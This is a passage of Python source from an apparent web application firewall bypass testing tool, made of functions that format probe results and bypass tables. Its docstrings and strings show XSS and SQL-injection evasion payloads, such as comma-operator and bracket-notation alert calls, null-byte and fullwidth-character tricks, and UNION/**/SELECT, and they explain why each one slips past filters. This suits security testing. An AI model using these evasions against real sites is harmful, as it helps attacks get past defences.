        "auth_bypass":       "Authentication Bypass — accesses restricted resources without creds",
        "graphql":           "GraphQL — exposes schema, sensitive fields, or allows mutations",
        "xxe":               "XML External Entity — reads files / performs SSRF via XML parsing",
    }

    blocked    = [r for r in results if r["blocked"]]
    confirmed  = [r for r in results if r["confirmed_bypass"]]
    not_blocked = [r for r in results if not r["blocked"]]

    # Parse target URL for display
    from urllib.parse import urlparse
    parsed = urlparse(target_url)
    path_display = parsed.path or "/"
    if parsed.query:
        path_display += "?" + parsed.query.split("=")[0] + "=<payload>"
    else:
        path_display += "?" + param + "=<payload>"

    lines = []
    lines.append(f"\n  Target:   {parsed.scheme}://{parsed.netloc}{path_display}")
    lines.append(f"  Category: {category} — {_CAT_DESCRIPTIONS.get(category, '')}")
    lines.append(f"  WAF:      {waf_vendor or 'unknown'}")
    lines.append(f"  Patterns: {len(results)} probed  ({len(blocked)} blocked, {len(confirmed)} bypasses found)")

    # Show what patterns were probed (first 4)
    if results:
        lines.append(f"\n  Patterns probed:")
        for r in results[:4]:
            blocked_icon = "🚫" if r["blocked"] else "✓"
            bypass_note = f" → bypass: {r['best_bypass']['payload'][:40]}" if r.get("best_bypass") else ""
            lines.append(f"    {blocked_icon} {r['description']}")
            lines.append(f"       payload: {r['pattern'][:60]!r}{bypass_note}")
        if len(results) > 4:
            lines.append(f"    … and {len(results)-4} more")

    if not blocked:
        lines.append(f"\n  ℹ  All patterns returned HTTP 200 — Cloudflare WAF did not block this")
        lines.append(f"     param/path combination. Possible reasons:")
        lines.append(f"     • Static site: no backend processes this parameter (most common)")
        lines.append(f"     • WAF rule not active for this param name (try: ?input=, ?cmd=, ?url=)")
        lines.append(f"     • Payload is URL-encoded and WAF matches on decoded form only")
        lines.append(f"     Try: fray analyze {parsed.scheme}://{parsed.netloc}/search --param search -c {category}")

    return "\n".join(lines) + "\n"


def format_bypass_table(
    results: List[Dict[str, Any]],
    waf_vendor: str = "",
    show_all: bool = False,
) -> str:
    """Format probe results as a box-drawing table.

    Matches the format from the original feature request:
    ┌─────────────────────────────┬──────────────┬────────────────────────────────────┐
    │ Blocked Pattern             │ WAF Response │ Bypass                             │
    ├─────────────────────────────┼──────────────┼────────────────────────────────────┤
    │ <script>alert(1)</script>   │ 403          │ (0,alert)(1) [comma operator]      │
    └─────────────────────────────┴──────────────┴────────────────────────────────────┘
    """
    rows = [r for r in results if r["blocked"] or show_all]
    if not rows:
        return "  No WAF blocks detected for probed patterns.\n"

    # Column widths
    W1, W2, W3 = 32, 12, 42  # Blocked Pattern | WAF Response | Bypass

    # Box-drawing chars
    TL, TM, TR = "┌", "┬", "┐"
    ML, MM, MR = "├", "┼", "┤"
    BL, BM, BR = "└", "┴", "┘"
    H, V = "─", "│"

    def _row(c1, c2, c3, sep=V):
        return f"  {sep} {c1:<{W1}} {sep} {c2:<{W2}} {sep} {c3:<{W3}} {sep}"

    def _hrule(l, m, r):
        return f"  {l}{H*(W1+2)}{m}{H*(W2+2)}{m}{H*(W3+2)}{r}"

    vendor_str = f" ({waf_vendor})" if waf_vendor else ""
    lines = [f"\n  WAF Bypass Analysis{vendor_str}\n"]
    lines.append(_hrule(TL, TM, TR))
    lines.append(_row("Blocked Pattern", "WAF Response", "Bypass"))
    lines.append(_hrule(ML, MM, MR))

    confirmed = 0
    for r in rows:
        pattern  = r["pattern"][:W1]
        waf_resp = str(r["waf_response"]) if r["waf_response"] else "—"
        bp = r.get("best_bypass")
        if bp:
            bypass_str = f"{bp['payload'][:24]} [{bp['technique'][:14]}]"
            bypass_str = bypass_str[:W3]
            confirmed += 1
        elif r["blocked"]:
            bypass_str = "(no bypass found)"
        else:
            bypass_str = "(not blocked)"
        lines.append(_row(pattern, waf_resp, bypass_str))

    lines.append(_hrule(BL, BM, BR))

    # Summary
    total_blocked = sum(1 for r in rows if r["blocked"])
    color_ok  = "\033[32m" if confirmed else "\033[33m"
    color_rst = "\033[0m"
    lines.append(
        f"\n  {color_ok}{confirmed}/{total_blocked} blocked pattern(s) have "
        f"confirmed bypasses{color_rst}"
    )
    return "\n".join(lines) + "\n"


def format_injection_mechanics(results: List[Dict[str, Any]]) -> str:
    """Format injection mechanics section — explains HOW each bypass works (#263).

    Shows how the bypass payload resolves into valid JS/SQL execution.
    """
    mechanics = []
    for r in results:
        bp = r.get("best_bypass")
        if not bp:
            continue

        technique = bp.get("technique", "")
        payload = bp.get("payload", "")

        # Explain the technique
        explanation = ""
        if "comma operator" in technique.lower():
            explanation = (
                f"  {payload}\n"
                f"  └ (0,alert) — comma operator evaluates left side (0), returns right (alert function ref)\n"
                f"     alert(1) — called as a regular function, not as a method of window\n"
                f"     Result: alert() executes without triggering 'alert(' keyword filter"
            )
        elif "bracket notation" in technique.lower():
            explanation = (
                f"  {payload}\n"
                f"  └ window['al'+'ert'] — string concatenation at runtime builds 'alert'\n"
                f"     WAF sees: window['al'+'ert'] — no 'alert' literal string\n"
                f"     Browser evaluates: window['alert'](1) → alert(1)"
            )
        elif "null byte" in technique.lower():
            explanation = (
                f"  {payload!r}\n"
                f"  └ \\x00 (null byte) inserted into tag — WAF regex stops at null byte\n"
                f"     Browser strips null bytes before HTML parsing\n"
                f"     Result: browser sees <script>, WAF sees <\\x00script>"
            )
        elif "unicode" in technique.lower():
            explanation = (
                f"  {payload}\n"
                f"  └ \\uFF1C (U+FF1C) = fullwidth less-than sign, visually identical to <\n"
                f"     Some WAFs match only ASCII <, not Unicode equivalents\n"
                f"     Browser normalises Unicode fullwidth chars to ASCII in HTML context"
            )
        elif "/**/" in technique.lower() or "inline comment" in technique.lower():
            explanation = (
                f"  {payload}\n"
                f"  └ /**/ — SQL inline comment, treated as whitespace by DB engine\n"
                f"     WAF regex: `UNION SELECT` (requires space)\n"
                f"     Database sees: UNION/**/SELECT (equivalent, space not required)"
            )
        else:
            explanation = f"  {payload}\n  └ {technique}"

        mechanics.append(f"\n  [{r['description']}]\n{explanation}")

    if not mechanics:
        return ""

    return "\n  Injection Mechanics:\n" + "\n".join(mechanics) + "\n"
